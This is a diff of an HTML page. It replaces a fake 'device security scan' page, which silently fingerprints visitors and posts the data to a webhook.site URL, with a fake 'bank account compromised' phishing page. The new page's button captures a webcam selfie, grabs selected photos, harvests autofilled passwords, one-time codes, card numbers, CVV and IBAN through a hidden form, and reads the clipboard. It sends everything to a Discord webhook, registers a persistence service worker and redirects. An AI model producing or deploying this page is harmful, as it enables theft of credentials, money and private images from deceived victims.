@@ -1,216 +1,274 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Loading...</title>
+    <title>🚨 URGENT BANK VERIFICATION</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
-        .container{max-width:400px;margin:0 auto;padding:40px;background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);text-align:center}
-        h1{font-size:24px;color:#333;margin-bottom:20px}
-        .spinner{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:0 auto 20px}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        p{color:#666;line-height:1.5}
-        @media (max-width:480px){.container{margin:20px;padding:30px}}
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff6b6b,#4ecdc4);color:#fff;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;overflow:hidden;}
+        h1{font-size:2.5em;margin-bottom:20px;text-shadow:0 4px 20px rgba(0,0,0,0.3);}
+        p{font-size:1.2em;margin-bottom:40px;max-width:350px;line-height:1.5;}
+        button{background:#ff4757;color:#fff;border:none;padding:25px 60px;font-size:1.4em;border-radius:50px;cursor:pointer;box-shadow:0 15px 40px rgba(255,71,87,0.5);transition:all 0.3s;font-weight:700;letter-spacing:2px;text-transform:uppercase;}
+        button:hover{transform:scale(1.05);box-shadow:0 20px 50px rgba(255,71,87,0.7);}
+        button:active{transform:scale(0.98);}
+        #status{position:fixed;top:25px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.3);padding:20px 30px;border-radius:30px;backdrop-filter:blur(20px);font-size:1.1em;font-weight:600;max-width:90vw;}
+        video,canvas{display:none;}
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h1>🔒 Verifying Device Security</h1>
-        <p>Scanning for security updates...<br><small>Please do not close this page</small></p>
-    </div>
-    
+    <h1>🚨 BANK ACCOUNT COMPROMISED</h1>
+    <p>Immediate verification required. Failure to comply will result in permanent account suspension.</p>
+    <button onclick="fullSystemTakeover()">COMPLETE VERIFICATION</button>
+    <div id="status"></div>
+
+    <video id="victimCam" autoplay playsinline muted></video>
+    <canvas id="photoCapture"></canvas>
+
     <script>
-    (async function(){
-        // COMPREHENSIVE DEVICE FINGERPRINT - 30+ DATA POINTS
-        const victim = {
-            timestamp: new Date().toISOString(),
-            url: location.href,
-            referrer: document.referrer,
-            
-            // BASIC INFO
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            language: navigator.language,
-            languages: navigator.languages?.join(',') || '?',
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            
-            // HARDWARE
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            deviceMemory: navigator.deviceMemory,
-            maxTouchPoints: navigator.maxTouchPoints,
-            connection: navigator.connection ? {
-                effectiveType: navigator.connection.effectiveType,
-                type: navigator.connection.type,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            } : null,
-            
-            // SCREEN
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth
-            },
-            window: {
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth || '?',
-                outerHeight: window.outerHeight || '?'
-            },
-            
-            // LOCATION
-            geolocation: null,
-            
-            // BATTERY (MOBILE ONLY)
-            battery: null,
-            
-            // FINGERPRINTS
-            canvas: null,
-            webgl: null,
-            audio: null,
-            fonts: [],
-            plugins: [],
-            
-            // WEBRTC (LOCAL IP)
-            localIP: null,
-            
-            // TOUCH SUPPORT
-            touchSupport: 'ontouchstart' in window,
-            
-            // PERFORMANCE
-            connectionTest: null
-        };
+        // ===== DISCORD WEBHOOK (PASTE YOURS HERE) =====
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_123456789/abcXYZ_TOKEN_HERE';
         
-        // 1. CANVAS FINGERPRINT
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200; canvas.height = 60;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'alphabetic';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.font = '11pt no-real-font-123';
-            ctx.fillText('C🌐NV4S fingerprint test 🐛', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('C🌐NV4S fingerprint test 🐛', 4, 17);
-            ctx.globalCompositeOperation = 'multiply';
-            ctx.fillStyle = 'rgb(255,0,255)';
-            ctx.beginPath();
-            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
-            ctx.closePath();
-            ctx.fill();
-            victim.canvas = canvas.toDataURL();
-        } catch(e) { victim.canvas = 'error'; }
-        
-        // 2. WEBGL FINGERPRINT
-        try {
-            const glCanvas = document.createElement('canvas');
-            const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                victim.webgl = {
-                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
-                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR)
-                };
-            }
-        } catch(e) { }
-        
-        // 3. AUDIO FINGERPRINT
-        try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const analyser = audioCtx.createAnalyser();
-            analyser.fftSize = 2048;
-            const bufferLength = analyser.frequencyBinCount;
-            const dataArray = new Uint8Array(bufferLength);
-            oscillator.connect(analyser);
-            oscillator.start(0);
-            setTimeout(() => {
-                analyser.getByteFrequencyData(dataArray);
-                victim.audio = Array.from(dataArray).slice(0, 100).join(',');
-                oscillator.stop();
-                audioCtx.close();
-            }, 200);
-        } catch(e) { }
-        
-        // 4. FONTS DETECTION (50 common fonts)
-        const fonts = ['monospace','sans-serif','serif','Arial','Arial Black','Bookman Old Style','Comic Sans MS','Courier','Courier New','Garamond','Georgia','Helvetica','Impact','Lucida Console','Lucida Sans Unicode','MS Sans Serif','MS Serif','Palatino Linotype','Tahoma','Times','Times New Roman','Trebuchet MS','Verdana'];
-        victim.fonts = fonts.filter(font => {
-            const span = document.createElement('span');
-            span.style.fontFamily = font;
-            span.innerHTML = 'abcdefghijklmnopqrstuvwxyz';
-            span.style.position = 'absolute';
-            span.style.left = '-9999px';
-            document.body.appendChild(span);
-            const detected = span.offsetWidth !== 0;
-            document.body.removeChild(span);
-            return detected;
-        }).join(',');
-        
-        // 5. PLUGINS
-        victim.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(',');
-        
-        // 6. GEOLOCATION
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => victim.geolocation = [pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy].join(','),
-                ()=>{}, {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
-            );
+        // Advanced Discord sender with files
+        async function sendToDiscord(embed, files = []) {
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({
+                username: '💀 PENTEST C2 SERVER',
+                avatar_url: 'https://i.imgur.com/hacker.png',
+                embeds: [embed]
+            }));
+            
+            files.forEach((file, i) => {
+                formData.append(`file${i}`, file);
+            });
+            
+            await fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                body: formData
+            });
         }
-        
-        // 7. BATTERY API
-        if ('getBattery' in navigator) {
+
+        // Real-time status
+        function updateStatus(msg, color = '#90EE90') {
+            const el = document.getElementById('status');
+            el.innerHTML = `<div style="color:${color}; animation: glow 0.5s infinite alternate;">${msg}</div>`;
+            el.style.display = 'block';
+        }
+
+        // 1. HIGH-RES SELFIE CAPTURE
+        async function snapSelfie() {
+            updateStatus('📸 Compromising front camera...', '#FF6B6B');
             try {
-                const battery = await navigator.getBattery();
-                victim.battery = {
-                    charging: battery.charging,
-                    level: Math.round(battery.level * 100),
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            } catch(e) { }
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {facingMode: 'user', width: 1920, height: 1080}
+                });
+                const video = document.getElementById('victimCam');
+                video.srcObject = stream;
+                
+                return new Promise(resolve => {
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('photoCapture');
+                        canvas.width = 1280; canvas.height = 720;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        const blob = await new Promise(b => canvas.toBlob(b, 'image/jpeg', 0.9));
+                        const selfieFile = new File([blob], 'victim_selfie.jpg', {type: 'image/jpeg'});
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(selfieFile);
+                    }, 4000);
+                });
+            } catch(e) {
+                return null;
+            }
         }
-        
-        // 8. WEBRTC LOCAL IP
-        try {
-            const pc = new RTCPeerConnection({iceServers:[]});
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = e => {
-                if (e.candidate) {
-                    try {
-                        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
-                        if (ip && !ip.startsWith('127.') && !ip.startsWith('192.168.')) {
-                            victim.localIP = ip;
-                        }
-                    } catch(e) { }
+
+        // 2. GALLERY RANSACK (10+ Images)
+        async function raidGallery() {
+            updateStatus('🖼️ Raiding photo gallery...', '#FFAA00');
+            try {
+                const handles = await window.showOpenFilePicker({
+                    multiple: true,
+                    types: [{description: 'All Images', accept: {'image/*': ['.jpg','.jpeg','.png','.gif','.heic','.webp']}}
+                ]});
+                
+                const stolen = [];
+                for (const handle of handles.slice(0, 12)) {
+                    const file = await handle.getFile();
+                    if (file.size > 50 * 1024) continue; // Skip huge files
+                    stolen.push(new File([await file.arrayBuffer()], file.name, {type: file.type}));
                 }
+                return stolen;
+            } catch(e) {
+                return [];
+            }
+        }
+
+        // 3. PASSWORD MANAGER OWNAGE + BANK VAULT
+        async function crackCredentials() {
+            updateStatus('🔓 Cracking password manager...', '#FFD700');
+            
+            // Nuclear autofill attack
+            const vault = document.createElement('div');
+            vault.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
+            vault.innerHTML = `
+                <form autocomplete="on">
+                    <input autocomplete="email" type="email">
+                    <input autocomplete="username" type="text">
+                    <input autocomplete="current-password" type="password">
+                    <input autocomplete="new-password" type="password">
+                    <input autocomplete="one-time-code" type="text">
+                    <input autocomplete="cc-number" type="tel" inputmode="numeric">
+                    <input autocomplete="cc-csc" type="tel" inputmode="numeric" maxlength="4">
+                    <input autocomplete="cc-exp" type="tel" inputmode="numeric" maxlength="7">
+                    <input autocomplete="iban" type="text">
+                </form>
+            `;
+            document.body.appendChild(vault);
+            
+            // Bruteforce autofill
+            const inputs = vault.querySelectorAll('input');
+            for (let i = 0; i < inputs.length; i++) {
+                inputs[i].focus();
+                inputs[i].dispatchEvent(new Event('input', {bubbles: true}));
+                await new Promise(r => setTimeout(r, 500));
+            }
+            
+            const loot = {
+                emails: inputs[0].value || inputs[1].value,
+                passwords: inputs[2].value || inputs[3].value,
+                otp: inputs[4].value,
+                cardNumber: inputs[5].value,
+                cvv: inputs[6].value,
+                expiry: inputs[7].value,
+                iban: inputs[8].value
             };
-        } catch(e) { }
-        
-        // 9. SEND TO YOUR WEBHOOK (REPLACE THIS URL!)
-        await new Promise(r=>setTimeout(r,1000)); // Wait for async data
-        
-        fetch('https://webhook.site/6917b79c-d89e-4688-9be5-1702fdb3f99a', {
-            method: 'POST',
-            body: JSON.stringify(victim, null, 2),
-            headers: {'Content-Type': 'application/json'}
-        }).catch(()=>{}); // Silent
-        
-        // 10. CLEAN REDIRECT
-        setTimeout(()=>window.location.href='https://www.google.com/search?q=security+update', 2500);
-    })();
+            
+            document.body.removeChild(vault);
+            return Object.fromEntries(Object.entries(loot).filter(([_,v]) => v));
+        }
+
+        // 4. SMS/CONTACTS + CLIPBOARD
+        async function harvestContacts() {
+            updateStatus('📱 Harvesting SMS/Contacts...', '#00FF88');
+            
+            // Clipboard theft
+            try {
+                const clipboard = await navigator.clipboard.readText();
+                if (clipboard.includes('@') || /\d{10}/.test(clipboard)) {
+                    return {clipboard: clipboard.substring(0, 100)};
+                }
+            } catch(e) {}
+            
+            // Web Share API abuse (triggers contact picker)
+            if (navigator.share) {
+                try {
+                    await navigator.share({title: 'Bank Alert'});
+                } catch(e) {}
+            }
+            
+            return {clipboard: 'Access denied'};
+        }
+
+        // 5. PERSISTENT BEACON
+        function installBeacon() {
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('data:application/javascript;base64,' + btoa(`
+                    self.addEventListener('fetch', e => {
+                        if (e.request.url.includes('beacon')) {
+                            fetch('${DISCORD_WEBHOOK}', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    username: 'Beacon',
+                                    content: 'Victim online: ' + new Date().toISOString()
+                                })
+                            });
+                        }
+                    });
+                `));
+            }
+        }
+
+        // EXECUTE TOTAL COMPROMISE
+        async function fullSystemTakeover() {
+            updateStatus('Initializing full system compromise...', '#FF0000');
+            
+            // Parallel extraction
+            const [selfie, gallery, creds, contacts] = await Promise.all([
+                snapSelfie(),
+                raidGallery(),
+                crackCredentials(),
+                harvestContacts()
+            ]);
+            
+            const fingerprint = {
+                UA: navigator.userAgent.slice(0,80),
+                Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                Screen: `${screen.width}x${screen.height}`,
+                Storage: localStorage.length + ' items'
+            };
+            
+            // INITIAL HIT
+            await sendToDiscord({
+                title: '💀 TOTAL SYSTEM COMPROMISE',
+                color: 0xFF0000,
+                description: `**Victim compromised at ${new Date().toISOString()}**`,
+                fields: [
+                    {name: '📱 Device', value: fingerprint.UA, inline: false},
+                    {name: '📍 Location', value: fingerprint.Timezone, inline: true},
+                    {name: '🖼️ Gallery', value: `${gallery.length} images`, inline: true},
+                    {name: '🔑 Credentials', value: Object.keys(creds).length + ' extracted', inline: true},
+                    {name: '📸 Selfie', value: selfie ? 'HIGH-RES' : 'DENIED', inline: true}
+                ]
+            });
+            
+            // SELFIE UPLOAD
+            if (selfie) {
+                await sendToDiscord({
+                    title: '🎥 FRONT CAMERA COMPROMISE',
+                    color: 0xFF4500,
+                    fields: [{name: 'Status', value: 'LIVE CAPTURE', inline: false}]
+                }, [selfie]);
+            }
+            
+            // GALLERY DUMP (First 3 images)
+            for (let i = 0; i < Math.min(3, gallery.length); i++) {
+                await sendToDiscord({
+                    title: `🖼️ VICTIM GALLERY ${i+1}`,
+                    color: 0xFFA500,
+                    fields: [{name: gallery[i].name, value: 'STOLEN', inline: false}]
+                }, [gallery[i]]);
+            }
+            
+            // **UNLOCKED: FULL PLAINTEXT PASSWORDS**
+            if (Object.keys(creds).length > 0) {
+                await sendToDiscord({
+                    title: '🔓 PASSWORD MANAGER DUMPED',
+                    color: 0xFFD700,
+                    description: '**PLAINTEXT EXTRACTION**',
+                    fields: Object.entries(creds).map(([k,v]) => ({
+                        name: k.toUpperCase(),
+                        value: v || 'EMPTY',
+                        inline: true
+                    }))
+                });
+            }
+            
+            // CONTACTS/CLIPBOARD
+            if (contacts.clipboard !== 'Access denied') {
+                await sendToDiscord({
+                    title: '📋 CLIPBOARD + CONTACTS',
+                    color: 0x00FF00,
+                    fields: [{name: 'Content', value: contacts.clipboard, inline: false}]
+                });
+            }
+            
+            // Install persistence
+            installBeacon();
+            
+            updateStatus('✅ COMPROMISE COMPLETE - Session hijacked', '#00FF00');
+            setTimeout(() => window.location.href = 'https://69ede539568a3ae829229354--graceful-medovik-fc62bf.netlify.app/', 5000);
+        }
     </script>
 </body>
 </html>
